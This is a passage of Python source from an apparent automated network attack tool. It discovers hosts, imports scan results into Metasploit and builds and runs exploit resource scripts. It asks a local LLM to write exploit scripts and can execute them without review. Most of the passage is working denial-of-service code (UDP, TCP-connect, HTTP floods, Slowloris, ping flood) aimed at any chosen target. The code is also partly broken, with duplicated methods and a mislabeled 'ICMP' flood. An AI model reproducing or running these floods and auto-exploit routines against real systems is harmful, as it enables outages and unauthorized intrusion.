                    self.viewer.error(f"Error downloading model: {str(e)}")
            
            # If we reach here, either checking or downloading failed
            # Fall back to default model
            if self.ollama_model != "qwen2.5-coder:7b" and self.ollama_model != "gemma3:1b":
                logger.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.viewer.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.ollama_model = "qwen2.5-coder:7b"
                
                # Recursively check if default model is available
                self._ensure_model_available()
        
        except Exception as e:
            logger.error(f"Error checking model availability: {e}")
            self.viewer.error(f"Error checking model availability: {str(e)}")
            
            # Fall back to default model in case of any error
            if self.ollama_model != "qwen2.5-coder:7b":
                logger.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.ollama_model = "qwen2.5-coder:7b"
        
        # Metasploit settings
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.msf_client = None
        self.msf_connected = False
        
        # Script settings
        self.auto_script = auto_script
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        
        # DoS attack settings
        self.dos_attack = dos_attack
        
        # Output settings
        self.quiet = quiet
        self.debug = debug
        
        # Set up logging level based on debug flag
        if debug:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)
        
        # Create a logger specific to this instance
        self.logger = logging.getLogger(f"adaptive_scanner.{id(self)}")
        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)
        
        # Add console handler if not already added
        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(console_handler)
        
        # Initialize the terminal viewer for output
        self.viewer = TerminalViewer(quiet=quiet)
        
        # Scan results history
        self.scan_history = []
        
        # Flag to control graceful termination
        self.running = True
        
        # Register signal handler for graceful termination
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # Handle auto-discovery if needed
        if self.auto_discover or not self.target:
            self._discover_network()
    
    def _discover_network(self):
        """Discover network and hosts if auto-discovery is enabled."""
        self.logger.info("Starting network discovery...")
        self.viewer.status("Discovering network hosts...")
        
        # Create network discovery object
        discovery = NetworkDiscovery(
            interface=self.interface,
            network=self.network,
            timeout=self.host_timeout
        )
        
        # Get network CIDR
        network = discovery.get_network_cidr()
        self.logger.info(f"Network: {network}")
        
        # Discover hosts
        animation = self.viewer.scanning_animation("Discovering live hosts")
        try:
            self.discovered_hosts = discovery.discover_hosts()
            
            # Wait for discovery to complete
            animation.set()
            
            if not self.discovered_hosts:
                self.logger.warning("No live hosts discovered in the network")
                self.viewer.warning("No live hosts discovered")
            else:
                self.logger.info(f"Discovered {len(self.discovered_hosts)} hosts: {', '.join(self.discovered_hosts)}")
                self.viewer.success(f"Discovered {len(self.discovered_hosts)} hosts")
                
                # Set the first host as target if not specified
                if not self.target:
                    self.target = self.discovered_hosts[0]
                    self.logger.info(f"Setting first discovered host as target: {self.target}")
                    self.viewer.status(f"Setting target to {self.target}")
                
                # If scan_all is enabled, we'll cycle through all hosts
                if self.scan_all:
                    self.logger.info(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
                    self.viewer.status(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
                    
                    # Initialize current target index
                    if self.target in self.discovered_hosts:
                        self.current_target_index = self.discovered_hosts.index(self.target)
                    else:
                        self.current_target_index = 0
                        self.target = self.discovered_hosts[0]
        except Exception as e:
            animation.set()
            self.logger.error(f"Error during network discovery: {e}")
            self.viewer.error(f"Network discovery failed: {str(e)}")
    
    def next_target(self) -> bool:
        """Move to the next target in the discovered hosts list.
        
        Returns:
            bool: True if there's a new target, False if we've scanned all hosts
        """
        if not self.scan_all or not self.discovered_hosts:
            return False
        
        self.current_target_index += 1
        
        # Check if we've scanned all hosts
        if self.current_target_index >= len(self.discovered_hosts):
            self.logger.info("All discovered hosts have been scanned")
            return False
        
        # Set the new target
        self.target = self.discovered_hosts[self.current_target_index]
        self.logger.info(f"Moving to next target: {self.target}")
        self.viewer.status(f"Moving to next target: {self.target}")
        
        return True
    
    def _signal_handler(self, sig, frame):
        """Handle termination signals gracefully."""
        self.logger.info("Received interrupt signal, shutting down gracefully...")
        self.viewer.warning("Interrupt received, shutting down gracefully...")
        self.running = False

    # Metasploit integration methods
    def setup_metasploit(self):
        """Set up connection to Metasploit RPC server."""
        if not self.msf_integration:
            return False
            
        try:
            self.logger.info("Setting up Metasploit RPC connection...")
            self.viewer.status("Connecting to Metasploit RPC server...")
            
            # Default Metasploit RPC settings
            password = "msf_password"  # Default password used in setup
            host = "127.0.0.1"
            port = 55553
            
            # Try to connect to Metasploit RPC
            try:
                self.msf_client = MsfRpcClient(
                    password,
                    server=host,
                    port=port,
                    ssl=False
                )
                
                # Check connection
                if self.msf_client.call('core.version')['version']:
                    self.msf_connected = True
                    self.logger.info("Successfully connected to Metasploit RPC")
                    
                    # Set up workspace
                    self._setup_msf_workspace()
                    
                    return True
            except Exception as e:
                self.logger.error(f"Error connecting to Metasploit RPC: {e}")
                
                # Try to start msfrpcd if it's not running
                self._start_msfrpcd(password, host, port)
                
                # Try connecting again
                try:
                    self.msf_client = MsfRpcClient(
                        password,
                        server=host,
                        port=port,
                        ssl=False
                    )
                    
                    # Check connection
                    if self.msf_client.call('core.version')['version']:
                        self.msf_connected = True
                        self.logger.info("Successfully connected to Metasploit RPC")
                        
                        # Set up workspace
                        self._setup_msf_workspace()
                        
                        return True
                except Exception as e2:
                    self.logger.error(f"Failed to connect to Metasploit RPC after starting msfrpcd: {e2}")
            
            # If we got here, we couldn't connect
            self.viewer.error("Failed to connect to Metasploit RPC")
            self.viewer.warning("Metasploit integration will be disabled")
            self.msf_integration = False
            return False
            
        except Exception as e:
            self.logger.error(f"Error setting up Metasploit: {e}")
            self.viewer.error(f"Error setting up Metasploit: {str(e)}")
            self.msf_integration = False
            return False
    
    def _start_msfrpcd(self, password, host, port):
        """Try to start the Metasploit RPC daemon."""
        self.logger.info("Attempting to start Metasploit RPC daemon...")
        
        try:
            # Check if msfrpcd is running using ps
            ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True)
            if f"msfrpcd -P {password}" in ps_output:
                self.logger.info("msfrpcd already running")
                return
                
            # Try to start msfrpcd
            cmd = [
                "msfrpcd",
                "-P", password,
                "-S",  # No SSL
                "-a", host,
                "-p", str(port)
            ]
            
            # Start msfrpcd in the background
            self.logger.info(f"Starting msfrpcd: {' '.join(cmd)}")
            subprocess.Popen(
                cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                start_new_session=True
            )
            
            # Give it time to start
            self.logger.info("Waiting for msfrpcd to start...")
            time.sleep(5)
            
        except Exception as e:
            self.logger.error(f"Error starting msfrpcd: {e}")
            
            # Try alternative - using systemctl
            try:
                self.logger.info("Trying to start msfrpcd using systemctl...")
                subprocess.run(
                    ["systemctl", "start", "msfrpcd"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                        check=True
                    )
                time.sleep(5)
            except Exception as e2:
                self.logger.error(f"Error starting msfrpcd using systemctl: {e2}")
    
    def _setup_msf_workspace(self):
        """Set up Metasploit workspace."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            # Get list of workspaces
            workspaces = self.msf_client.call('db.workspaces')
            
            # Check if our workspace exists
            workspace_exists = False
            for ws in workspaces['workspaces']:
                if ws['name'] == self.msf_workspace:
                    workspace_exists = True
                    break
            
            # Create workspace if it doesn't exist
            if not workspace_exists:
                self.logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
                self.msf_client.call('db.add_workspace', [self.msf_workspace])
            
            # Set current workspace
            self.logger.info(f"Setting Metasploit workspace to: {self.msf_workspace}")
            self.msf_client.call('db.set_workspace', [self.msf_workspace])
            
        except Exception as e:
            self.logger.error(f"Error setting up Metasploit workspace: {e}")
    
    def process_results_with_metasploit(self, result):
        """Process scan results with Metasploit to import hosts and services."""
        if not self.msf_connected or not self.msf_client or not result:
            return
            
        try:
            self.logger.info("Processing scan results with Metasploit...")
            
            # Check if target is in scan results
            if 'scan' not in result or self.target not in result['scan']:
                self.logger.warning(f"Target {self.target} not found in scan results")
                return
                
            target_info = result['scan'][self.target]
            
            # Import host
            host_data = {
                'host': self.target,
                'state': 'alive',
                'name': '',
                'os_name': '',
                'os_flavor': '',
                'os_sp': '',
                'os_lang': '',
                'arch': '',
                'mac': '',
                'scope': self.msf_workspace
            }
            
            # Add hostname if available
            if 'hostnames' in target_info and target_info['hostnames']:
                host_data['name'] = target_info['hostnames'][0].get('name', '')
                
            # Add OS info if available
            if 'osmatch' in target_info and target_info['osmatch']:
                os_match = target_info['osmatch'][0]
                host_data['os_name'] = os_match.get('name', '').split()[0]  # Get first word as OS name
                host_data['os_flavor'] = ' '.join(os_match.get('name', '').split()[1:])  # Rest as flavor
                
            # Import the host
            try:
                host_id = self.msf_client.call('db.report_host', [host_data])
                self.logger.debug(f"Imported host {self.target} with ID {host_id}")
            except Exception as e:
                self.logger.error(f"Error importing host to Metasploit: {e}")
            
            # Import services
            for proto in ['tcp', 'udp']:
                if proto in target_info:
                    for port, port_data in target_info[proto].items():
                        if port_data['state'] == 'open':
                            service_data = {
                                'host': self.target,
                                'port': int(port),
                                'proto': proto,
                                'state': 'open',
                                'name': port_data.get('name', ''),
                                'info': '',
                            }
                            
                            # Add version info if available
                            if 'product' in port_data and port_data['product']:
                                service_info = port_data['product']
                                if 'version' in port_data and port_data['version']:
                                    service_info += f" {port_data['version']}"
                                service_data['info'] = service_info
                            
                            # Import the service
                            try:
                                service_id = self.msf_client.call('db.report_service', [service_data])
                                self.logger.debug(f"Imported service {port}/{proto} on {self.target} with ID {service_id}")
                            except Exception as e:
                                self.logger.error(f"Error importing service to Metasploit: {e}")
            
            self.logger.info("Successfully imported scan results to Metasploit")
            
            # Run exploits if enabled
            if self.exploit:
                self.find_matching_exploits()
                
        except Exception as e:
            self.logger.error(f"Error processing results with Metasploit: {e}")
    
    def find_matching_exploits(self):
        """Find matching exploits for the target's open services."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            self.logger.info(f"Finding matching exploits for {self.target}...")
            self.viewer.status(f"Finding matching exploits for {self.target}...")
            
            # Get host services
            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
            
            # Check if we have services
            if not services or 'services' not in services or not services['services']:
                self.logger.warning(f"No services found for {self.target}")
                return
                
            # Extract service information
            target_services = []
            for service in services['services']:
                if service['state'] == 'open':
                    service_info = {
                        'port': service['port'],
                        'proto': service['proto'],
                        'name': service['name'],
                        'info': service['info']
                    }
                    target_services.append(service_info)
            
            self.logger.info(f"Found {len(target_services)} open services on {self.target}")
            
            # If we should automatically run exploits
            if self.exploit:
                self.run_exploits_on_host(self.target)
            else:
                # Generate a Metasploit resource script
                script_path = self.generate_resource_script()
                
                if script_path:
                    self.viewer.script_generation_summary(
                        script_path,
                        "Metasploit Resource Script",
                        f"Resource script for exploiting {self.target}"
                    )
                    
                    # Run the script if execute_scripts is enabled
                    if self.execute_scripts:
                        result = self.run_resource_script(script_path)
                        if result:
                            self.viewer.success(f"Successfully executed resource script: {script_path}")
                        else:
                            self.viewer.warning(f"Failed to execute resource script: {script_path}")
        except Exception as e:
            self.logger.error(f"Error finding matching exploits: {e}")
    
    def generate_resource_script(self):
        """Generate a Metasploit resource script for the target."""
        if not self.msf_connected or not self.msf_client:
            return None
            
        try:
            self.logger.info(f"Generating Metasploit resource script for {self.target}...")
            
            # Get host services
            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
            
            # Check if we have services
            if not services or 'services' not in services or not services['services']:
                self.logger.warning(f"No services found for {self.target}")
                return None
                
            # Create script directory if it doesn't exist
            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
            os.makedirs(script_dir, exist_ok=True)
            
            # Generate script filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            script_path = os.path.join(script_dir, f"metasploit_{self.target.replace('.', '_')}_{timestamp}.rc")
            
            # Get local IP to use for payload
            local_ip = self._get_local_ip()
            
            # Generate resource script content
            content = [
                f"# Metasploit resource script for {self.target}",
                f"# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "",
                f"workspace {self.msf_workspace}",
                "",
                "# Set global variables",
                f"setg RHOSTS {self.target}",
                f"setg LHOST {local_ip}",
                "setg LPORT 4444",
                "",
                "# Scan modules"
            ]
            
            # Add scan modules
            for service in services['services']:
                if service['state'] == 'open':
                    port = service['port']
                    proto = service['proto']
                    name = service['name']
                    
                    content.append(f"# Port {port}/{proto} - {name}")
                    
                    # Add scanner modules based on service
                    if name == 'ssh':
                        content.append(f"use auxiliary/scanner/ssh/ssh_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'http' or name == 'https':
                        content.append(f"use auxiliary/scanner/http/http_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'smb' or name == 'microsoft-ds':
                        content.append(f"use auxiliary/scanner/smb/smb_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'ftp':
                        content.append(f"use auxiliary/scanner/ftp/ftp_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    
                    content.append("")
            
            # Add exploit modules section
            content.append("# Exploit modules")
            
            # Add resource script footer
            content.append("")
            content.append("# End of resource script")
            
            # Write to file
            with open(script_path, "w") as f:
                f.write("\n".join(content))
                
            self.logger.info(f"Generated resource script: {script_path}")
            return script_path
            
        except Exception as e:
            self.logger.error(f"Error generating resource script: {e}")
            return None
    
    def run_resource_script(self, script_path):
        """Run a Metasploit resource script."""
        if not os.path.exists(script_path):
            self.logger.error(f"Resource script not found: {script_path}")
            return False
            
        try:
            self.logger.info(f"Running resource script: {script_path}")
            self.viewer.status(f"Running Metasploit resource script: {os.path.basename(script_path)}")
            
            # Run msfconsole with resource script
            cmd = [
                "msfconsole",
                "-q",  # Quiet mode
                "-r", script_path
            ]
            
            # Execute the command
            self.logger.debug(f"Executing: {' '.join(cmd)}")
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Process output
            output, error = process.communicate()
            
            # Log results
            if process.returncode == 0:
                self.logger.info(f"Resource script executed successfully")
                if self.debug:
                    self.logger.debug(f"Output: {output}")
                return True
            else:
                self.logger.error(f"Resource script execution failed: {error}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error running resource script: {e}")
            return False
    
    def run_exploits_on_host(self, target):
        """Run exploits on the target host."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            self.logger.info(f"Running exploits on {target}...")
            self.viewer.status(f"Running exploits on {target}...")
            
            # Generate and run a resource script
            script_path = self.generate_resource_script()
            
            if script_path:
                result = self.run_resource_script(script_path)
                
                # Display result
                if result:
                    self.viewer.success(f"Completed exploit attempts on {target}")
                else:
                    self.viewer.warning(f"Exploit attempts on {target} may have failed")
            
        except Exception as e:
            self.logger.error(f"Error running exploits: {e}")
    
    def _get_local_ip(self):
        """Get the local IP address to use for callbacks."""
        try:
            # Get all interfaces
            interfaces = []
            for iface in netifaces.interfaces():
                # Skip loopback interfaces
                if iface.startswith('lo') or iface == 'lo':
                    continue
                    
                # Get addresses for interface
                addresses = netifaces.ifaddresses(iface)
                
                # Get IPv4 addresses
                if netifaces.AF_INET in addresses:
                    for addr in addresses[netifaces.AF_INET]:
                        ip = addr.get('addr')
                        if ip and ip != '127.0.0.1':
                            interfaces.append((iface, ip))
            
            # Get the IP of the interface we're using if specified
            if self.interface:
                for iface, ip in interfaces:
                    if iface == self.interface:
                        return ip
            
            # Otherwise, use the first non-virtual interface
            for iface, ip in interfaces:
                name = iface.lower()
                # Skip virtual interfaces
                if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
                    continue
                return ip
            
            # If no suitable interface found, use the first available
            if interfaces:
                return interfaces[0][1]
            
            # Default to localhost if nothing else works
            return "127.0.0.1"
            
        except Exception as e:
            self.logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"

    # DoS attack methods
    def perform_dos_attack(self, target):
        """Perform a DoS attack against the target."""
        try:
            self.logger.info(f"Starting DoS attack against {target} using method: {self.dos_method}")
            
            # Map attack methods to their implementations
            attack_methods = {
                'udp': self._udp_flood_attack,
                'icmp': self._icmp_flood_attack,
                'slowloris': self._slowloris_attack,
                'syn': self._syn_flood_attack,
                'http': self._http_flood_attack,
                'cpu': self._cpu_exhaustion_attack,
                'memory': self._memory_exhaustion_attack,
                'disk': self._disk_exhaustion_attack,
                'http2': self._http2_dos_attack,
                'dns': self._dns_amplification_attack,
                'slowpost': self._slowpost_attack,
                'dbpool': self._dbpool_exhaustion_attack,
                'cache': self._cache_poisoning_attack,
                'bgp': self._bgp_route_poisoning_attack,
                'arp': self._arp_cache_poisoning_attack,
                'vlan': self._vlan_hopping_attack
            }
            
            # Get the attack method
            attack_method = attack_methods.get(self.dos_method.lower())
            if not attack_method:
                self.logger.error(f"Unknown DoS attack method: {self.dos_method}")
                return False
                
            # Perform the attack
            success = attack_method(target)
            
            if success:
                self.logger.info(f"DoS attack completed successfully against {target}")
            else:
                self.logger.error(f"DoS attack failed against {target}")
                
            return success
            
        except Exception as e:
            self.logger.error(f"Error in DoS attack: {e}")
            return False
    
    def _udp_flood_attack(self, target):
        """Perform a UDP flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(self.dos_payload.encode(), (target, 80))
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in UDP flood attack: {e}")
            return False
            
    def _icmp_flood_attack(self, target):
        """Perform an ICMP flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        sock.send(self.dos_payload.encode())
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in ICMP flood attack: {e}")
            return False
            
    def _slowloris_attack(self, target):
        """Perform a Slowloris attack."""
        try:
            import socket
            import threading
            import time
            
            def slowloris():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        sock.send("GET / HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {target}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                        sock.send("Accept-Language: en-us,en;q=0.5\r\n".encode())
                        sock.send("Accept-Encoding: gzip,deflate\r\n".encode())
                        sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n".encode())
                        sock.send("Keep-Alive: 115\r\n".encode())
                        sock.send("Connection: keep-alive\r\n".encode())
                        sock.send("X-Forwarded-For: 127.0.0.1\r\n".encode())
                        sock.send("Content-Length: 42\r\n".encode())
                        sock.send("\r\n".encode())
                        connections.append(sock)
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            connections = []
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=slowloris)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            # Close all connections
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
                    
            return True
            
        except Exception as e:
            self.logger.error(f"Error in Slowloris attack: {e}")
            return False
            
    def _syn_flood_attack(self, target):
        """Perform a SYN flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect((target, 80))
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in SYN flood attack: {e}")
            return False
            
    def _http_flood_attack(self, target):
        """Perform an HTTP flood attack."""
        try:
            import requests
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        requests.get(f"http://{target}/", headers={
                            "User-Agent": "Mozilla/5.0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-us,en;q=0.5",
                            "Accept-Encoding": "gzip,deflate",
                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                            "Keep-Alive": "115",
                            "Connection": "keep-alive",
                            "X-Forwarded-For": "127.0.0.1"
                        })
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in HTTP flood attack: {e}")
            return False
    
    def _generic_flood_attack(self, target, ports):
        """Perform a generic network flood attack."""
        try:
            self.logger.info(f"Performing generic flood attack on {target}...")
            
            # Choose a random port if available, otherwise use port 80
            port = random.choice(ports) if ports else 80
            
            # Use ping flood as a simple generic attack
            cmd = [
                "ping",
                "-f",  # Flood
                "-c", "1000",  # 1000 packets
                target
            ]
            
            # Execute attack
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for it to complete
            output, error = process.communicate()
            
            if process.returncode == 0:
                self.logger.info(f"Generic flood attack completed on {target}")
                return True
            else:
                self.logger.error(f"Generic flood attack failed: {error}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error performing generic flood attack: {e}")
            return False
    
    def _udp_flood_attack(self, target):
        """Perform a UDP flood attack."""
        try:
            script = f"""
import socket
import threading
import time

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"X" * 1024, ("{target}", 80))

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in UDP flood attack: {e}")
            return False
            
    def _icmp_flood_attack(self, target):
        """Perform an ICMP flood attack."""
        try:
            script = f"""
import socket
import threading
import time

def icmp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.connect(("{target}", 80))
        except:
            pass

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=icmp_flood)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in ICMP flood attack: {e}")
            return False
            
    def _slowloris_attack(self, target):
        """Perform a Slowloris attack."""
        try:
            script = f"""
import socket
import threading
import time

def slowloris():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("{target}", 80))
            sock.send("GET / HTTP/1.1\\r\\n")
            sock.send("Host: {target}\\r\\n")
            sock.send("User-Agent: Mozilla/5.0\\r\\n")
            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n")
            sock.send("Accept-Language: en-us,en;q=0.5\\r\\n")
            sock.send("Accept-Encoding: gzip,deflate\\r\\n")
            sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n")
            sock.send("Keep-Alive: 115\\r\\n")
            sock.send("Connection: keep-alive\\r\\n")
        except:
            pass

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=slowloris)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in Slowloris attack: {e}")
            return False
    
    # Script generation and execution methods
    def generate_custom_script(self, script_type="bash", target_info=None):
        """Generate a custom script for the target based on scan results."""
        try:
            self.logger.info(f"Generating custom {script_type} script for {self.target}...")
            self.viewer.status(f"Generating custom {script_type} script...")
            
            # Use target info if provided, otherwise get open ports from history
            if not target_info:
                open_ports = self.get_open_ports_from_history()
                target_info = {
                    'target': self.target,
                    'open_ports': open_ports
                }
            
            # Create script directory if it doesn't exist
            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
            os.makedirs(script_dir, exist_ok=True)
            
            # Generate script filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            script_filename = f"{self.target.replace('.', '_')}_{timestamp}.{self._get_script_extension(script_type)}"
            script_path = os.path.join(script_dir, script_filename)
            
            # Prepare context for the LLM
            context = self.prepare_ollama_context()
            
            # Construct the prompt for the LLM
            prompt = f"""Generate a {script_type} script to interact with or exploit the target system at {self.target}.

Target Information:
- IP Address: {self.target}
- Open Ports: {target_info.get('open_ports', [])}

Requirements:
- The script should be written in {script_type}
- It should perform reconnaissance on the open ports
- Include error handling and proper exit codes
- Add helpful comments explaining what each section does
- The script must be ethical and non-destructive

Script Template Format:
```{script_type}
#!/bin/bash  # Or appropriate shebang
# Script title
# Description
# Usage instructions

# Main code here
```

Please generate a complete, executable {script_type} script:"""

            # Call Ollama to generate the script
            self.logger.info(f"Asking Ollama to generate a {script_type} script...")
            response = self.call_ollama(prompt)
            
            if not response:
                self.logger.error("Failed to get response from Ollama")
                # Generate a fallback script without LLM
                script_content = self._generate_fallback_script(script_type, target_info)
            else:
                # Extract the script from the response
                script_content = self._extract_script_from_response(response, script_type)
            
            # Write the script to file
            with open(script_path, "w") as f:
                f.write(script_content)
            
            # Make the script executable
            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
            
            self.logger.info(f"Generated {script_type} script: {script_path}")
            self.viewer.script_generation_summary(
                script_path,
                script_type.upper(),
                f"Custom script for reconnaissance of {self.target}"
            )
            
            # Execute the script if requested
            if self.execute_scripts:
                self.execute_generated_script(script_path)
            
            return script_path
            
        except Exception as e:
            self.logger.error(f"Error generating custom script: {e}")
            self.self.logger.info("Script generation failed: {str(e)}")
            return None
    
    def _extract_script_from_response(self, response, script_type):
        """Extract the script from the LLM response."""
        try:
            # Regular expression to extract code blocks
            code_block_pattern = r"```(?:" + script_type + r"|shell|bash)?(.+?)```"
            code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
            
            if code_blocks:
                # Use the first code block
                return code_blocks[0].strip()
            else:
                # If no code blocks found, just use the whole response
                return response.strip()
                
        except Exception as e:
            self.logger.error(f"Error extracting script from response: {e}")
            return response.strip()
    
    def _generate_fallback_script(self, script_type, target_info):
        """Generate a fallback script without using the LLM."""
        target = target_info.get('target', self.target)
        open_ports = target_info.get('open_ports', [])
        
        if script_type.lower() == "bash" or script_type.lower() == "shell":
            return self._generate_fallback_bash_script(target, open_ports)
        elif script_type.lower() == "python":
            return self._generate_fallback_python_script(target, open_ports)
        else:
            # Default to bash
            return self._generate_fallback_bash_script(target, open_ports)
    
    def _generate_fallback_bash_script(self, target, open_ports):
        """Generate a fallback bash script."""
        script = f"""#!/bin/bash
# Reconnaissance Script for {target}
# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# This script performs basic reconnaissance on a target system

TARGET="{target}"
OPEN_PORTS=({' '.join(str(port) for port in open_ports)})

echo "Starting reconnaissance on $TARGET"
echo "Open ports: ${{OPEN_PORTS[@]}}"

# Ping the target
echo "Checking if host is up..."
ping -c 3 $TARGET

# Check each open port
for PORT in "${{OPEN_PORTS[@]}}"; do
  echo "Checking port $PORT..."
  
  case $PORT in
    21)
      echo "FTP port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    22)
      echo "SSH port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    80|443)
      echo "Web port detected, checking headers..."
      curl -s -I http://$TARGET:$PORT
      ;;
    *)
      echo "Generic port check..."
      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
      ;;
  esac
done

echo "Reconnaissance completed"
"""
        return script
    
    def _generate_fallback_python_script(self, target, open_ports):
        """Generate a fallback Python script."""
        script = f"""#!/usr/bin/env python3
# Reconnaissance Script for {target}
# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# This script performs basic reconnaissance on the target system

import socket
import subprocess
import sys
import os

TARGET = "{target}"
OPEN_PORTS = {open_ports}

def main():
    print(f"Starting reconnaissance on {{TARGET}}")
    print(f"Open ports: {{OPEN_PORTS}}")
    
    # Ping the target
    print("Checking if host is up...")
    try:
        subprocess.run(["ping", "-c", "3", TARGET], check=True)
